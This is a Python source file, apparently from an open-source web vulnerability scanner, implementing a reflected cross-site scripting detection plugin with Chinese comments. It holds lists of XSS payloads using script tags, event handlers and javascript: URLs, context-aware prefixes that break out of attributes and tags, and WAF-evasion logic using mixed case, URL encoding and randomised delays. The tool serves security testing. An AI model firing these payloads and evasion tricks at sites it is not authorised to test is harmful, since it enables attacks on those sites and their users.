"""
plugins/pocs/xss_scan.py — 跨站脚本攻击 (XSS) 检测插件

功能：
  • 反射型 XSS 检测
  • 基于 HTML 语义的上下文感知注入（闭合属性 / 逃逸标签）
  • 联动 WAF 状态，自适应采用更隐蔽的混淆 Payload（大小写 / 编码）
  • 返回精确触发位置。
"""

from __future__ import annotations

import asyncio
import logging
import random
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.request import AsyncRequester, smart_merge
from plugins.base import BasePlugin, PluginMeta, ScanResult, Severity

logger = logging.getLogger("openscanner.plugin.xss")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 探测 Payload 集合
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# 核心验证特征符 (随机生成前缀后缀以防止误伤)
_MARKER_BASE = "lsxss"

_STEALTH_PAYLOADS = [
    "<sCrIpT>confirm(1)</sCrIpT>",
    "<sVg/onload=confirm(1)>",
    "\" onmouseover=\"confirm(1)",
    "'-prompt(1)-'",
    "javascript:confirm(1)//",
]

_STD_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\" autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
]


def _extract_params(url: str) -> Dict[str, str]:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] if v else "" for k, v in qs.items()}


def _inject_param(url: str, param: str, payload: str, context_params: Optional[Dict[str, str]] = None) -> str:
    """利用 smart_merge 注入 payload，同时保留背景参数"""
    context_params = context_params or {}
    return smart_merge(url, context_params, param, payload)


class XssScanPlugin(BasePlugin):
    """
    高级跨站脚本 (XSS) 检测插件
    """

    meta = PluginMeta(
        name="xss_scan",
        display_name="XSS Scanner",
        description="三位一体的高级跨站脚本注入检测插件",
        severity=Severity.HIGH,
        tags=["xss", "injection", "owasp-top10"],
        version="1.0.0",
    )

    async def check(
        self,
        url: str,
        requester: AsyncRequester,
        context: Optional[Dict[str, Any]] = None,
    ) -> ScanResult:
        context = context or {}
        params = _extract_params(url)

        if not params:
            return self.result(url, is_vulnerable=False, detail="URL 无查询参数，跳过 XSS 检测。")

        waf_data = context.get("waf", {})
        waf_detected = False
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        if url in waf_data and waf_data[url].get("detected"):
            waf_detected = True
        else:
            for c_url, info in waf_data.items():
                if c_url.startswith(base_url) and info.get("detected"):
                    waf_detected = True
                    break

        if waf_detected:
            logger.info("[XSS] 🎯 目标部署有 WAF，切换至隐蔽混淆模式")
        
        findings: List[Dict[str, Any]] = []
        attempts: List[Dict[str, Any]] = []

        rand_int = random.randint(1000, 9999)
        marker = f"{_MARKER_BASE}{rand_int}"
        business_params = context.get("business_params", {})

        for param in params:
            # 阶段一：纯随机字符反射探测 (无任何攻击性)
            probe_url = _inject_param(url, param, marker, business_params)
            try:
                if waf_detected:
                    await asyncio.sleep(random.uniform(1.0, 2.0))
                resp = await requester.get(probe_url)
                resp_text = resp.text
            except Exception as e:
                logger.debug("[XSS] Probe failed: %s", e)
                attempts.append({"payload": marker, "type": "Probe", "status": "Error", "info": str(e)})
                continue

            # 如果 marker 原样回显，进行语义分析
            if marker in resp_text:
                logger.debug("[XSS] 反射点发现: 参数 %s", param)
                attempts.append({"payload": marker, "type": "Probe", "status": "Reflected"})
                evidence = self._analyze_html_context(resp_text, marker)
                
                # 阶段二：注入真实 Payload
                vuln_hits = await self._test_real_payload(
                    url, param, marker, evidence, requester, waf_detected, business_params, attempts
                )
                if vuln_hits:
                    findings.extend(vuln_hits)
            else:
                attempts.append({"payload": marker, "type": "Probe", "status": "Safe"})

        if not findings:
            return self.result(url, is_vulnerable=False, extra={"attempts": attempts})

        best = max(findings, key=lambda f: f.get("confidence", 0))
        all_params = list(set(f["param"] for f in findings))
        
        return self.result(
            url,
            is_vulnerable=True,
            detail=f"发现跨站脚本注入 (XSS) | 注入参数: {', '.join(all_params)} | 发现 {len(findings)} 个触发点",
            evidence=f"注入参数 [{best['param']}]\n触发 Payload: {best['payload']}\n上下文: {best['context_evidence']}",
            extra={
                "findings": findings,
                "attempts": attempts,
                "vulnerable_params": all_params,
                "waf_bypassed": waf_detected
            }
        )

    def _analyze_html_context(self, html: str, marker: str) -> Dict[str, str]:
        """语义分析: 确定反射数据的 HTML 上下文"""
        
        # 0. Anti-ReDoS 快速定位与切片 (避免在多兆页面上执行非确定性有限状态机从而死锁)
        idx = html.find(marker)
        if idx == -1:
            return {"type": "unknown", "raw": "Not reflected"}
            
        start = max(0, idx - 2000)
        end = min(len(html), idx + 2000)
        chunk = html[start:end]
        
        # 1. 在引号内 (属性值)
        attr_match = re.search(r'="[^"]*' + marker + r'[^"]*"', chunk, re.IGNORECASE)
        if attr_match:
            return {"type": "attribute_double_quote", "raw": attr_match.group(0)}
            
        attr_single = re.search(r"='[^']*'?" + marker + r"[^']*'", chunk, re.IGNORECASE)
        if attr_single:
            return {"type": "attribute_single_quote", "raw": attr_single.group(0)}

        # 2. 在 Script 标签内
        script_match = re.search(r'<script[^>]*>.*?' + marker + r'.*?</script>', chunk, re.IGNORECASE | re.DOTALL)
        if script_match:
            return {"type": "script_context", "raw": script_match.group(0)[:100] + "..."}

        # 3. 在 Textarea 或 Title 等特殊标签内
        special_tags = ["textarea", "title", "option", "noscript"]
        for tag in special_tags:
            tag_match = re.search(f'<{tag}[^>]*>.*?' + marker + f'.*?</{tag}>', chunk, re.IGNORECASE | re.DOTALL)
            if tag_match:
                return {"type": f"special_tag_{tag}", "raw": tag_match.group(0)}

        # 4. 各种标签的文本内容
        return {"type": "html_body", "raw": "Reflected in plain HTML body"}

    async def _test_real_payload(
        self,
        url: str,
        param: str,
        marker: str,
        ctx: Dict[str, str],
        requester: AsyncRequester,
        waf: bool,
        business_params: Dict[str, str],
        attempts: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        results = []
        prefix = ""
        c_type = ctx["type"]
        if c_type == "attribute_double_quote":
            prefix = "\">"
        elif c_type == "attribute_single_quote":
            prefix = "'>"
        elif c_type == "script_context":
            prefix = "';</script>"
        elif c_type.startswith("special_tag_"):
            tag = c_type.split("_")[-1]
            prefix = f"</{tag}>"
        
        payloads = _STEALTH_PAYLOADS if waf else _STD_PAYLOADS
        sem = asyncio.Semaphore(4)  # XSS payload 并发探测

        async def _test_one_payload(i, p):
            async with sem:
                full_payload = prefix + p
                if waf and i % 2 == 1:
                    from urllib.parse import quote
                    full_payload = quote(full_payload)
                
                p_url = _inject_param(url, param, full_payload, business_params)
                
                try:
                    if waf:
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                    resp = await requester.get(p_url)
                    body = resp.text
                    
                    from urllib.parse import unquote
                    expected = unquote(full_payload) if waf and i % 2 == 1 else full_payload
                    
                    if expected in body:
                        hit = {
                            "param": param,
                            "payload": full_payload,
                            "context": c_type,
                            "context_evidence": ctx["raw"],
                            "confidence": 0.90
                        }
                        results.append(hit)
                        attempts.append({
                            "payload": full_payload, 
                            "type": f"XSS ({c_type})", 
                            "status": "Vulnerable", 
                            "status_code": resp.status_code
                        })
                    else:
                        attempts.append({
                            "payload": full_payload, 
                            "type": f"XSS ({c_type})", 
                            "status": "Safe", 
                            "status_code": resp.status_code
                        })
                except Exception as e:
                    attempts.append({"payload": full_payload, "type": "XSS", "status": "Error", "info": str(e)})

        await asyncio.gather(*[_test_one_payload(i, p) for i, p in enumerate(payloads)])
                
        return results
